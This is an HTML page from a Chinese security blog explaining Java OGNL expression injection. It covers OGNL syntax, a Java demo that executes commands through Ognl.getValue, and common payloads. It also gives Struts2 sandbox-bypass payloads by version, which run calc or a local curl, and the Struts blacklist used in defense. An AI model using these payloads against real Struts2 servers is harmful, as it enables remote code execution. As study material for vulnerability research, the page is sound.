@@ -1,0 +1,143 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Java OGNL 表达式注入"><meta name="keywords" content="Java,OGNL"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>Java OGNL 表达式注入 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-159554347-1', 'auto');
+ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-OGNL-Object-Graph-Navigation-Library"><span class="toc-number">1.</span> <span class="toc-text">0x01 OGNL (Object Graph Navigation Library)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-使用-OGNL"><span class="toc-number">2.</span> <span class="toc-text">0x02 使用 OGNL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-OGNL-注入"><span class="toc-number">3.</span> <span class="toc-text">0x03 OGNL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-注入绕过与防御"><span class="toc-number">4.</span> <span class="toc-text">0x04 注入绕过与防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">求知若饥，虚心若愚</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">45</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">43</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/links/">友链</a><a class="site-page" href="/about/">关于我</a></span></div><div id="post-info"><div id="post-title">Java OGNL 表达式注入</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-19</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>学习 Java OGNL 表达式注入</p>
+<a id="more"></a>
+<h2 id="0x01-OGNL-Object-Graph-Navigation-Library"><a href="#0x01-OGNL-Object-Graph-Navigation-Library" class="headerlink" title="0x01 OGNL (Object Graph Navigation Library)"></a>0x01 OGNL (Object Graph Navigation Library)</h2><blockquote>
+<p>OGNL代表对象图导航语言；它是一种表达语言，用于获取和设置Java对象的属性，以及其他附加功能，例如列表投影和选择以及lambda表达式。您可以使用相同的表达式来获取和设置属性值。</p>
+</blockquote>
+<p>OGNL三要素: </p>
+<ul>
+<li>表达式（expression）<ul>
+<li>ognl 表达式要执行的具体操作</li>
+</ul>
+</li>
+<li>根对象（root）<ul>
+<li>表达式的操作由根对象来指定对目标对象的操作，可直接引用根对象属性</li>
+</ul>
+</li>
+<li>上下文环境（context）<ul>
+<li>对象运行的上下文环境（map类型）</li>
+</ul>
+</li>
+</ul>
+<p>之前分析的 Struct2 的历史漏洞中，最终都是通过 ognl 达到执行命令的目的，而 struct2 中的 ognl 的 context 就是 ActionContext，根对象即熟悉的 valueStack</p>
+<h2 id="0x02-使用-OGNL"><a href="#0x02-使用-OGNL" class="headerlink" title="0x02 使用 OGNL"></a>0x02 使用 OGNL</h2><p>在 ognl 注入中常用的也就是对上下文环境、静态方法的访问</p>
+<p>OGNL 中的所有变量都是整个表达式的全局变量</p>
+<ul>
+<li>获取上下文环境变量：<code>#var</code></li>
+<li>设置变量：<code>#var = 99</code></li>
+<li>访问静态变量：<code>@[class]@[field]</code></li>
+<li>调用静态方法：<code>@[class]@[method()]</code>，<a href="mailto:`@java.lang.Runtime" target="_blank" rel="noopener">`@java.lang.Runtime</a>@getRuntime().exec(‘id’)`</li>
+<li>直接使用构造方法进行构造</li>
+</ul>
+<p><strong>特殊符号</strong></p>
+<p><code>#</code></p>
+<ol>
+<li><p>用于访问非根对象属性（ OGNL 和 Action 上下文）</p>
+</li>
+<li><p>还可以表示自身，<code>listeners.size().(#this &gt; 100? 2*#this : 20+#this)</code></p>
+</li>
+<li>创建 map，<code>#{e1 : e2, ... }</code>，或 <code>#@classname@{ e1 : e2, ... }</code></li>
+</ol>
+<p><code>%</code></p>
+<ol>
+<li>告诉执行环境 <code>%{}</code> 里的是 OGNL 表达式并计算表达式的值。</li>
+<li>求余数 <code>e1 % e2</code></li>
+</ol>
+<p><code>$</code></p>
+<ol>
+<li>在相关配置文件中引入OGNL表达式，即在配置文件中解析OGNL表达式</li>
+<li>用于正则匹配 <code>objects.{$ #this instanceof String }</code>，将返回对象中包含的最后一个元素，该对象是String类的实例</li>
+</ol>
+<p><code>.</code></p>
+<ol>
+<li>获取非静态方法调用</li>
+<li>获取对象的属性</li>
+<li>投影 <code>e1.{e2}</code></li>
+<li>选择 <code>e1.{? e2}</code></li>
+<li>子表达式求值 <code>e1.(e2)</code></li>
+</ol>
+<p><code>@</code></p>
+<ol>
+<li>获取静态方法</li>
+<li>获取静态变量</li>
+</ol>
+<p><code>,</code></p>
+<ol>
+<li>顺序操作符 <code>e1, e2</code>，e1 和 e2 都使用相同的源对象进行计算，并返回 e2 的结果。</li>
+</ol>
+<p>更多详细内容可以参考官方文档：<a href="https://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">https://commons.apache.org/proper/commons-ognl/language-guide.html</a></p>
+<h2 id="0x03-OGNL-注入"><a href="#0x03-OGNL-注入" class="headerlink" title="0x03 OGNL 注入"></a>0x03 OGNL 注入</h2><p>Ognl 的 getValue 和 setValue 都可以用来执行代码，比如 S2-003 就是利用了 setValue</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建一个OGNL上下文对象</span></span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// getValue() 触发</span></span><br><span class="line">        <span class="comment">// @[类全名(包括包路径)]@[方法名|值名]</span></span><br><span class="line">        <span class="comment">//Ognl.getValue("@java.lang.Runtime@getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')", context, context.getRoot());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// getValue() 使用 new</span></span><br><span class="line">        Ognl.getValue(<span class="string">"(new java.lang.ProcessBuilder(new java.lang.String[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;).start())"</span>, context, context.getRoot());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// setValue() 触发</span></span><br><span class="line">        <span class="comment">//Ognl.setValue("(\"@java.lang.Runtime@getRuntime().exec(\'/Applications/Calculator.app/Contents/MacOS/Calculator\')\")(a)(b)",context,"");</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 setValue 中形如 <code>()(a)(b)</code> 的表达式在 ognl 处理的时候会先计算  <code>()(a)</code>，然后返回带有 payload 的 ASTEval 树，再以 <code>b</code> 为root 计算 AST 树，最终执行命令</p>
+<p>常用 paylaod：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//获取当前路径</span><br><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br><span class="line"></span><br><span class="line">//使用 runtime 执行系统命令</span><br><span class="line">@java.lang.Runtime@getRuntime().exec(&apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;)</span><br><span class="line"></span><br><span class="line">//使用 processbuilder 执行系统命令</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;).start())</span><br></pre></td></tr></table></figure>
+<p>常见注入点和写法（<a href="https://www.freebuf.com/vuls/168609.html）" target="_blank" rel="noopener">https://www.freebuf.com/vuls/168609.html）</a><br><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-ognl.assets/4.png" alt="img"></p>
+<h2 id="0x04-注入绕过与防御"><a href="#0x04-注入绕过与防御" class="headerlink" title="0x04 注入绕过与防御"></a>0x04 注入绕过与防御</h2><p>OGNL 作为 Struts2 框架的默认表达式语言，在 struct2 的众多历史漏洞中被多次绕过，但是，绝大多数是通过 <code>_memberAccess</code> 等属性修改限制条件来达到绕过的目的</p>
+<p><strong>绕过</strong></p>
+<p> <strong>&lt; Struts 2.3.14.1</strong></p>
+<p>通过 <code>_memberAccess</code> 设置 allowStaticMethodAccess 开启静态方法调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true).(@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;))</span><br></pre></td></tr></table></figure>
+<p><strong>&lt; Struts 2.3.20</strong></p>
+<p>使用类的构造函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#p=new java.lang.ProcessBuilder(&apos;calc&apos;)).(#p.start())</span><br></pre></td></tr></table></figure>
+<p><strong>&lt; Struts 2.3.29</strong></p>
+<p>在2.3.20后，Struts2 引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），阻止了所有构造函数的使用</p>
+<p>通过  <code>_memberAccess</code> 的父类 <code>DefaultMemberAccess</code> 覆盖 <code>_memberAccess</code> 绕过限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;))</span><br></pre></td></tr></table></figure>
+<p><strong>&lt; Struts 2.3.30+/2.5.2+</strong></p>
+<p>利用 container 获取 ognlUtil 再使用 clear 方法清空 excludedClasses、excludedPackageNames，然后 setMemberAccess 方法设置默认的 memberAccess</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;))</span><br></pre></td></tr></table></figure>
+<p><strong>&lt; Struts 2.5.16</strong></p>
+<p>2.5.13 版本中使用的是 3.1.15 的 ognl 包，禁止了对 context.map 的访问</p>
+<p>通过<code>attr</code> 获取一个<code>context.map</code>，然后通过 setExcludedPackageNames 和 setExcludedClasses 将名单置空，再覆盖        <code>_memberAccess</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(#context=#attr[&apos;struts.valueStack&apos;].context).(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&apos;&apos;)).(#ognlUtil.setExcludedPackageNames(&apos;&apos;))</span><br><span class="line"></span><br><span class="line">(#context=#attr[&apos;struts.valueStack&apos;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&apos;curl 127.0.0.1:9001&apos;))</span><br></pre></td></tr></table></figure>
+<p><strong>防御</strong></p>
+<p>在 struct2 中官方主要通过黑名单的方式来修补漏洞，虽然前期也是被频频绕过，但从最近的版本能看出黑名单的变化</p>
+<p>在 struts 2.5.20 中，查看 struts-default.xml 的 excludedClasses  和 excludedPackageNames 黑名单内容如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.excludedClasses"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">value</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">            java.lang.Object,</span></span></span><br><span class="line"><span class="tag"><span class="string">            java.lang.Runtime,</span></span></span><br><span class="line"><span class="tag"><span class="string">            java.lang.System,</span></span></span><br><span class="line"><span class="tag"><span class="string">            java.lang.Class,</span></span></span><br><span class="line"><span class="tag"><span class="string">            java.lang.ClassLoader,</span></span></span><br><span class="line"><span class="tag"><span class="string">            java.lang.Shutdown,</span></span></span><br><span class="line"><span class="tag"><span class="string">            java.lang.ProcessBuilder,</span></span></span><br><span class="line"><span class="tag"><span class="string">            com.opensymphony.xwork2.ActionContext"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- this must be valid regex, each '.' in package name must be escaped! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- it's more flexible but slower than simple string comparison --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- constant name="struts.excludedPackageNamePatterns" value="^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)" / --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- this is simpler version of the above used with string comparison --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.excludedPackageNames"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">value</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">            ognl.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            javax.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            freemarker.core.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            freemarker.template.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            freemarker.ext.rhino.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            sun.reflect.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            javassist.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            org.objectweb.asm.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            com.opensymphony.xwork2.ognl.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            com.opensymphony.xwork2.security.,</span></span></span><br><span class="line"><span class="tag"><span class="string">            com.opensymphony.xwork2.util."</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>连 struct2 重写的 ognl 包 xwork2.ognl 也在 excludedPackageNames 中，而且在 OgnlUtil 中的有关方法属性也产生了变化，这就导致修改黑名单绕过的方法越发困难</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">https://commons.apache.org/proper/commons-ognl/language-guide.html</a></p>
+<p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL表达式注入漏洞总结/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://lucifaer.com/2019/01/16/浅析OGNL的攻防史/#0x03-OGNL的攻防史" target="_blank" rel="noopener">https://lucifaer.com/2019/01/16/%E6%B5%85%E6%9E%90OGNL%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2/#0x03-OGNL%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2020/08/19/java-ognl/">http://j0k3r.top/2020/08/19/java-ognl/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/OGNL/">OGNL</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/25/CISCN-2020/"><i class="fa fa-chevron-left">  </i><span>CISCN 2020 第十三届全国大学生信息安全竞赛 初赛 WEB Writeup</span></a></div><div class="next-post pull-right"><a href="/2020/08/14/struct2-s2-059/"><span>S2-059 漏洞与不同 Struct2 版本的 Payload 分析</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
+var verify = 'true' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'yeOeLCiDRMa7CAnJy2jxA2IY-gzGzoHsz',
+  appKey:'eAgtubAYTMshS76hpc1F1UBG',
+  placeholder:'Just go go',
+  avatar:'mm',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer class="footer-bg" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>
